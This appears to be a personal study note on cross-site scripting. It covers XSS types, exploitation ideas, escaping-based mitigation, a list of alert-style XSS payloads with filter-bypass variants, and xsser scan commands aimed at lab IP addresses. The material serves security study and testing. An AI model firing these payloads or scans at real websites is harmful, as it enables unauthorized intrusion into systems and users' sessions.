# XSS

##
- بعد از تزریق کد اسکریپت، باید به page source code رفته تا اثر تزریق را در صفحه ببینیم، تا رفتار سرور و متعاقبا نحوه bypass آن را متوجه شویم

## Types
- Reflected
- Stored
- DOM Based
  - Nothing send to server (check with Burp), instead use both Javascript functions types simultaneously:
    - source: ```?name=alireza => document.url()```
    - sink: ```getElementById()``` & ```document.write()```

## Exploitation
- Session Hijacking (SEC542-4)
- Fake Page (SEC542-4)
- [BeEF](../Tools/beef.md)

## Mitigation
- Minimize the usage of user input on html
- Escape any untrusted input before inserting it into the page
  - ```&``` => ```&amp;```
  - ```<``` => ```&lt;```
  - ```>``` => ```&gt;```
  - ```"``` => ```&quot;```
  - ```'``` => ```&#x27;```
  - ```/``` => ```&#x2F;```
- [XSS-Prevention-CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) 

## Payloads
```Javascript
a'"><script>alert(888)</script>
a"><script>alert(888)</script>
</title><script>alert(888)</script>
'; alert(888)'//
%27;+alert(888);//
a<script>alert(888)</script>
a<SCript>alert(888)</SCript>
a<scri<script>pt>alert(888)</scri</script>pt>
a<img src='aaa' onerror='alert(888)'/>
a<script>prompt(888)</script>
a<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 56, 56, 56, 41))</script>
a";alert(888);//
a";alert(888);"
a';alert(888);//
a';alert(888);'
/"><script>alert(888)</script>
<BODY ONLOAD=alert(888)>
```

## xsser
- POST
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'```
    - XSSer will substitute payload in place of "XSS" string
    - ```p``` shows parameter in POST request (intercept request and copy parameter values from Burp) 
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto```
    - Trying various XSS payloads by using XSSer's ```--auto``` option
  - ```xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"```
    - Using custom XSS payload 
- GET
  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote"```
  - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"```
    - Providing basic XSS payload to XSSer
- Authenticated
  - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0"```
  - ```xsser --url "http://192.158.102.3/htmli_get.php?firstname=XSS&lastname=hello&form=submit" --cookie="PHPSESSID=j278tohghcg7lbr220uhf4rg22; security_level=0" --Fp "<script>alert(1)</script>"```
    - Scan the target using basic XSS payload
